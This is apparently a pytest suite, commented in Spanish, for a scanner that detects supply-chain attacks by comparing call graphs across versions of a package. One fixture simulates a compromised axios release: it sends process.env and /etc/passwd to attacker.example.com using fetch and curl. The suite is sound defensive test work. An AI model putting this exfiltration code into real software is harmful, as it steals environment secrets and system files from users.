"""
Tests RF-06: behavioral_delta.py
Caso de referencia obligatorio: supply chain attack axios@1.14.1 (RAT inyectado).
Nuevos edges a red/proceso en v_nueva que no existian en v_anterior -> BEHAVIORAL_ANOMALY.
"""
from pathlib import Path
import pytest
from secops.scanner.ast_engine import parse_file, ParseResult
from secops.scanner.behavioral_delta import analyze, build_call_graph

# ---------------------------------------------------------------------------
# Fixtures: axios 1.14.0 (limpio) vs 1.14.1 (supply chain attack)
# ---------------------------------------------------------------------------

AXIOS_1_14_0_CLEAN = """\
// axios 1.14.0 - version limpia
function dispatchRequest(config) {
  var response = sendRequest(config);
  return response;
}
function sendRequest(config) {
  return buildFullPath(config.baseURL, config.url);
}
"""

# Supply chain: codigo malicioso inyectado - nueva funcion con callback a C2
AXIOS_1_14_1_MALICIOUS = """\
// axios 1.14.1 - version con RAT inyectado
function dispatchRequest(config) {
  var response = sendRequest(config);
  exfiltrateData(process.env);
  return response;
}
function sendRequest(config) {
  return buildFullPath(config.baseURL, config.url);
}
// Codigo inyectado por atacante
function exfiltrateData(env) {
  fetch('https://attacker.example.com/collect', {
    method: 'POST',
    body: JSON.stringify(env)
  });
  child_process.exec('curl -d @/etc/passwd attacker.example.com');
}
"""

# Fix legitimo: cambio en logica interna sin nuevas operaciones privilegiadas
AXIOS_1_7_9_BEFORE_FIX = """\
// axios 1.7.9 - antes del fix de allowAbsoluteUrls
function xhrAdapter(config) {
  var fullPath = buildFullPath(config.baseURL, config.url);
  request.open(config.method, fullPath);
}
"""

AXIOS_1_8_2_AFTER_FIX = """\
// axios 1.8.2 - despues del fix
function xhrAdapter(config) {
  var url = config.allowAbsoluteUrls !== false
    ? config.url
    : buildFullPath(config.baseURL, config.url);
  request.open(config.method, url);
}
"""


def _parse(tmp_path: Path, filename: str, content: str) -> ParseResult:
    f = tmp_path / filename
    f.write_text(content)
    return parse_file(f, "javascript")


# ---------------------------------------------------------------------------
# Tests supply chain attack (RF-06 criterio de aceptacion obligatorio)
# ---------------------------------------------------------------------------

class TestSupplyChainDetection:
    """axios 1.14.0 -> 1.14.1: RAT inyectado debe generar BEHAVIORAL_ANOMALY CRITICAL/HIGH."""

    def test_supply_chain_detected_as_behavioral_anomaly(self, tmp_path):
        """RF-06: supply chain attack en axios@1.14.1 debe generar BEHAVIORAL_ANOMALY."""
        old = _parse(tmp_path, "axios_old.js", AXIOS_1_14_0_CLEAN)
        new = _parse(tmp_path, "axios_new.js", AXIOS_1_14_1_MALICIOUS)
        findings = analyze([old], [new], "axios", "1.14.0", "1.14.1")
        anomalies = [f for f in findings if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity != "INFO"]
        assert len(anomalies) >= 1, (
            "Supply chain attack axios@1.14.1 no detectado. "
            f"Hallazgos: {[f.title for f in findings]}"
        )

    def test_supply_chain_severity_is_critical_or_high(self, tmp_path):
        old = _parse(tmp_path, "axios_old.js", AXIOS_1_14_0_CLEAN)
        new = _parse(tmp_path, "axios_new.js", AXIOS_1_14_1_MALICIOUS)
        findings = analyze([old], [new], "axios", "1.14.0", "1.14.1")
        anomalies = [f for f in findings if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity != "INFO"]
        if anomalies:
            severities = {f.severity for f in anomalies}
            assert severities & {"CRITICAL", "HIGH"}, (
                f"Supply chain attack deberia ser CRITICAL o HIGH. Severidades: {severities}"
            )

    def test_fetch_to_external_host_detected(self, tmp_path):
        """La llamada a fetch('attacker.example.com') debe ser edge nuevo privilegiado."""
        old = _parse(tmp_path, "old.js", AXIOS_1_14_0_CLEAN)
        new = _parse(tmp_path, "new.js", AXIOS_1_14_1_MALICIOUS)
        findings = analyze([old], [new], "axios", "1.14.0", "1.14.1")
        net_anomalies = [
            f for f in findings
            if f.finding_type == "BEHAVIORAL_ANOMALY"
            and any(k in f.description for k in ("fetch", "child_process", "exec", "red", "proceso"))
        ]
        assert len(net_anomalies) >= 1, (
            "No se detecto la llamada a red/proceso del RAT inyectado. "
            f"Hallazgos: {[f.description[:80] for f in findings]}"
        )


# ---------------------------------------------------------------------------
# Tests fix legitimo (RF-06 criterio de aceptacion obligatorio)
# ---------------------------------------------------------------------------

class TestLegitimateFixNotFlaggedAsCritical:
    """axios 1.7.9 -> 1.8.2: fix legitimo no debe ser BEHAVIORAL_ANOMALY CRITICAL."""

    def test_legitimate_fix_not_critical_anomaly(self, tmp_path):
        """RF-06: fix de CVE-2025-27152 no debe generar BEHAVIORAL_ANOMALY critico."""
        old = _parse(tmp_path, "xhr_old.js", AXIOS_1_7_9_BEFORE_FIX)
        new = _parse(tmp_path, "xhr_new.js", AXIOS_1_8_2_AFTER_FIX)
        findings = analyze([old], [new], "axios", "1.7.9", "1.8.2")
        critical_anomalies = [
            f for f in findings
            if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity == "CRITICAL"
        ]
        assert len(critical_anomalies) == 0, (
            "Fix legitimo no debe generar BEHAVIORAL_ANOMALY CRITICAL. "
            f"Hallazgos CRITICAL: {[f.title for f in critical_anomalies]}"
        )


# ---------------------------------------------------------------------------
# Tests sin baseline
# ---------------------------------------------------------------------------

class TestNoBaseline:
    def test_no_baseline_returns_info_finding(self, tmp_path):
        """RF-06: sin version anterior en cache -> hallazgo INFO NO_BASELINE."""
        new = _parse(tmp_path, "new.js", AXIOS_1_14_0_CLEAN)
        findings = analyze(None, [new], "axios", None, "1.14.0")
        assert len(findings) == 1
        assert findings[0].severity == "INFO"
        assert "NO_BASELINE" in findings[0].title


# ---------------------------------------------------------------------------
# Tests de call graph
# ---------------------------------------------------------------------------

class TestCallGraph:
    def test_build_call_graph_detects_functions_and_calls(self, tmp_path):
        src = tmp_path / "test.js"
        src.write_text(
            "function foo() { bar(); baz(); }\n"
            "function bar() { return 1; }\n"
        )
        result = parse_file(src, "javascript")
        graph = build_call_graph([result])
        assert "foo" in graph.edges or "__module__" in graph.edges

    def test_no_third_party_tools_used(self):
        """RF-14: behavioral_delta no usa herramientas de terceros."""
        import secops.scanner.behavioral_delta as mod
        import inspect
        source = inspect.getsource(mod)
        for forbidden in ["import bandit", "import semgrep", "import safety", "import pip_audit"]:
            assert forbidden not in source


# ---------------------------------------------------------------------------
# Tests de casos borde en build_call_graph (lineas 76, 85)
# ---------------------------------------------------------------------------

class TestBuildCallGraphEdgeCases:
    """Cubre paths de control en build_call_graph: parse_error y llamadas en scope de modulo."""

    def test_parse_error_result_is_skipped_in_build_call_graph(self, tmp_path):
        """ParseResult con parse_error se omite -- continue en linea 76.

        El grafo resultante no debe contener nodos del resultado con error.
        """
        bad_result = ParseResult(
            file_path=str(tmp_path / "bad.js"),
            language="javascript",
            nodes=[],
            parse_error="SyntaxError: unexpected token at line 3",
        )
        graph = build_call_graph([bad_result])
        # Sin nodos procesables, el grafo debe quedar vacio
        assert graph.edges == {}, (
            "build_call_graph con parse_error debe producir grafo vacio. "
            f"Edges obtenidos: {graph.edges}"
        )
        assert graph.all_calls == [], (
            "build_call_graph con parse_error no debe registrar llamadas. "
            f"Calls obtenidos: {graph.all_calls}"
        )

    def test_parse_error_mixed_with_valid_still_processes_valid(self, tmp_path):
        """Si un result tiene error y otro es valido, el valido si se procesa."""
        bad_result = ParseResult(
            file_path=str(tmp_path / "bad.js"),
            language="javascript",
            nodes=[],
            parse_error="SyntaxError: unexpected token",
        )
        good_src = tmp_path / "good.js"
        good_src.write_text(
            "function foo() { bar(); }\n"
            "function bar() { return 1; }\n"
        )
        good_result = parse_file(good_src, "javascript")
        graph = build_call_graph([bad_result, good_result])
        assert len(graph.edges) >= 1, (
            "El result valido debe generar edges aunque haya uno con parse_error."
        )

    def test_call_at_module_scope_creates_module_edge(self, tmp_path):
        """Llamada en scope de modulo (antes de cualquier funcion) crea edge en __module__ (linea 85).

        Cuando hay un nodo de tipo 'call' antes de cualquier declaracion de funcion,
        current_function sigue siendo '__module__'. Ese caller no esta en graph.edges todavia,
        asi que la rama `if current_function not in graph.edges` se ejecuta y crea el entry.
        """
        src = tmp_path / "module_scope.js"
        src.write_text(
            "// llamada en scope de modulo antes de definir funciones\n"
            "fetch('https://api.example.com/data');\n"
            "function helper() { return 1; }\n"
        )
        result = parse_file(src, "javascript")
        graph = build_call_graph([result])
        # __module__ debe aparecer como caller con fetch como callee
        assert "__module__" in graph.edges, (
            "Las llamadas en scope de modulo deben registrarse bajo '__module__'. "
            f"Edges obtenidos: {list(graph.edges.keys())}"
        )
        assert "fetch" in graph.edges["__module__"], (
            "fetch llamado en scope de modulo debe aparecer en edges['__module__']. "
            f"Callees de __module__: {graph.edges.get('__module__', set())}"
        )

    def test_multiple_calls_at_module_scope_all_registered(self, tmp_path):
        """Multiples llamadas en scope de modulo se registran bajo __module__ sin duplicar el key."""
        src = tmp_path / "multi_module_calls.js"
        src.write_text(
            "fetch('https://api.example.com/data');\n"
            "console.log('started');\n"
            "function init() { return true; }\n"
        )
        result = parse_file(src, "javascript")
        graph = build_call_graph([result])
        assert "__module__" in graph.edges, (
            "Multiples llamadas en scope de modulo deben estar bajo '__module__'."
        )
        # El key debe aparecer una sola vez (set, no duplicado)
        module_calls = graph.edges["__module__"]
        assert isinstance(module_calls, set), (
            "graph.edges['__module__'] debe ser un set."
        )


# ---------------------------------------------------------------------------
# Tests de analyze: INFO para nuevos edges no privilegiados (linea 164)
# ---------------------------------------------------------------------------

class TestAnalyzeNonPrivilegedNewEdges:
    """Cubre la rama INFO de analyze cuando v_nueva tiene nuevos edges no privilegiados (linea 164)."""

    def test_new_non_privileged_edge_generates_info_finding(self, tmp_path):
        """v_nueva agrega una llamada interna nueva (no privilegiada) -> INFO finding (linea 164).

        La condicion `non_privileged_new > 0 and not findings` se activa cuando:
        - Hay edges nuevos en v_nueva que no existian en v_anterior
        - Ninguno de esos edges apunta a operaciones privilegiadas
        Esto produce un BEHAVIORAL_ANOMALY de severidad INFO.
        """
        old_src = tmp_path / "v1.js"
        old_src.write_text(
            "function process(config) {\n"
            "  return formatOutput(config);\n"
            "}\n"
            "function formatOutput(config) { return config; }\n"
        )
        # v_nueva agrega una llamada interna a validateInput -- no es operacion privilegiada
        new_src = tmp_path / "v2.js"
        new_src.write_text(
            "function process(config) {\n"
            "  validateInput(config);\n"
            "  return formatOutput(config);\n"
            "}\n"
            "function formatOutput(config) { return config; }\n"
            "function validateInput(config) { return true; }\n"
        )
        old_result = parse_file(old_src, "javascript")
        new_result = parse_file(new_src, "javascript")
        findings = analyze([old_result], [new_result], "test_dep", "1.0.0", "1.1.0")
        info_findings = [
            f for f in findings
            if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity == "INFO"
        ]
        assert len(info_findings) >= 1, (
            "Nuevos edges no privilegiados deben generar un hallazgo INFO. "
            f"Hallazgos obtenidos: {[(f.severity, f.title) for f in findings]}"
        )
        # Verificar que el hallazgo INFO mencione edges nuevos
        assert any("edge" in f.title.lower() or "edge" in f.description.lower()
                   for f in info_findings), (
            "El hallazgo INFO debe mencionar los nuevos edges. "
            f"Descripcion: {info_findings[0].description if info_findings else 'N/A'}"
        )
